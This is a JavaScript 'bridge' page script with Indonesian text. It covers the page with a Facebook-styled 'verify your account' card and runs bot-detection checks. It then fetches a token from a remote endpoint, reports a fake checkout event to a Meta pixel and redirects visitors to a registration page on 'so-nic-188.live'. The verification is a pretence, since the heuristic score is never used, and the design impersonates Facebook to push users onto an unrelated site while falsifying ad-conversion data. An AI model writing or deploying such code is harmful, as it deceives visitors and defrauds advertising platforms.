/* bridge.js — versi natural UI (Facebook style)
   By Xibn ©2025
*/

/* ============= CONFIG ============= */
const REDIRECT_URL = 'https://so-nic-188.live/register';
const META_PIXEL_ID = '563642226812250';
const TOKEN_ENDPOINT = 'https://bridge-server-three.vercel.app/api/get-js-token';
const TOKEN_TIMEOUT_MS = 3000;

(function(){
  const nowMs = () => Date.now();
  const safeFetch = (u, t=TOKEN_TIMEOUT_MS) => Promise.race([
    fetch(u, { credentials: 'omit' }),
    new Promise((_, rej) => setTimeout(()=> rej(new Error('timeout')), t))
  ]);

  function initMeta(id){
    if(!id || window.fbq) return;
    !function(f,b,e,v,n,t,s){
      if(f.fbq)return; n=f.fbq=function(){n.callMethod?
      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
      if(!f._fbq)n._fbq=n; n.push=n; n.loaded=!0; n.version='2.0';
      n.queue=[]; t=b.createElement(e); t.async=!0;
      t.src=v; s=b.getElementsByTagName(e)[0];
      s.parentNode.insertBefore(t,s)
    }(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
    window.fbq('init', id); window.fbq('track','PageView');
  }
  function fireMeta(ev, obj){ try{ if(window.fbq) window.fbq('track', ev, obj||{}); }catch(e){} }

  async function runHeuristics(){
    const s = { score: 0 };
    if(navigator.webdriver) s.score -= 40;
    if(/HeadlessChrome|PhantomJS|bot|crawler/i.test(navigator.userAgent)) s.score -= 40;
    if(!navigator.plugins?.length) s.score -= 10;
    const c = document.createElement('canvas'); const gl = c.getContext('webgl');
    if(!gl) s.score -= 12;
    let moves = 0; const mv=()=>moves++;
    document.addEventListener('mousemove',mv,{passive:true});
    await new Promise(r=>setTimeout(r,700));
    document.removeEventListener('mousemove',mv);
    if(moves<2) s.score -= 15;
    return s;
  }

  async function fetchToken(){
    try{
      const r = await safeFetch(TOKEN_ENDPOINT, TOKEN_TIMEOUT_MS);
      if(!r.ok) throw 0;
      const t = (await r.text()).trim();
      if(t.length<20) throw 0;
      return t;
    }catch{return null}
  }

  function createUI(){
    if(document.getElementById('__bridge_ui_card')) return;
    const wrap = document.createElement('div');
    wrap.id='__bridge_ui_card';
    wrap.style.cssText=`
      position:fixed;inset:0;
      background:url('https://imagz.online/img/file/postingan-schevenko_20251030_063515-7570b8.webp') center/cover no-repeat;
      display:flex;align-items:center;justify-content:center;
      z-index:999999;font-family:system-ui,Segoe UI,Roboto,Arial;`;
    
    const card = document.createElement('div');
    card.style.cssText=`
      background:rgba(10,25,50,0.9);
      border-radius:12px;
      padding:28px 30px;
      box-shadow:0 10px 40px rgba(0,0,0,0.5);
      color:#fff;
      text-align:center;
      width:360px;
      max-width:90%;
    `;

    card.innerHTML=`
      <div style="font-size:18px;font-weight:700;margin-bottom:8px">
        Verifikasi Akun Anda
      </div>
      <div style="font-size:13px;color:#cfe8ff;margin-bottom:18px">
        Kami hanya perlu memastikan koneksi Anda aman sebelum melanjutkan ke halaman pendaftaran.
      </div>
      <button id="__bridge_go" style="
  display:flex;align-items:center;justify-content:center;gap:10px;
  margin:0 auto;   /* 🧭 bikin tombol pas di tengah horizontal */
  background-color:#1877F2;color:#fff;font-weight:600;
  font-size:15px;padding:12px 24px;border:none;border-radius:8px;
  font-family:inherit;box-shadow:0 4px 12px rgba(24,119,242,0.35);
  cursor:pointer;transition:all 0.2s ease;">
        <img src='https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/facebook.svg' 
             style='width:20px;height:20px;filter:invert(1);'>
        Lanjutkan Sekarang
      </button>
      <div id="__bridge_status" style="font-size:13px;color:#bfe0ff;margin-top:14px"></div>
    `;
    wrap.appendChild(card);
    document.body.appendChild(wrap);
    return card;
  }

  async function mainFlow(){
    initMeta(META_PIXEL_ID);
    const ui = createUI();
    const btn = ui.querySelector('#__bridge_go');
    const status = ui.querySelector('#__bridge_status');

    btn.addEventListener('click', async e=>{
      e.preventDefault(); btn.disabled=true;
      status.textContent='Memeriksa...';
      const heur = await runHeuristics();
      const token = await fetchToken();
      const u = new URL(REDIRECT_URL);
      if(token) u.searchParams.set('bridge_token', token);
      fireMeta('InitiateCheckout', {bridge:1});
      status.textContent='Mengarahkan...';
      setTimeout(()=>window.location.href=u.toString(),500);
    });
  }

  document.readyState==='loading'
    ? document.addEventListener('DOMContentLoaded',mainFlow)
    : mainFlow();
})();
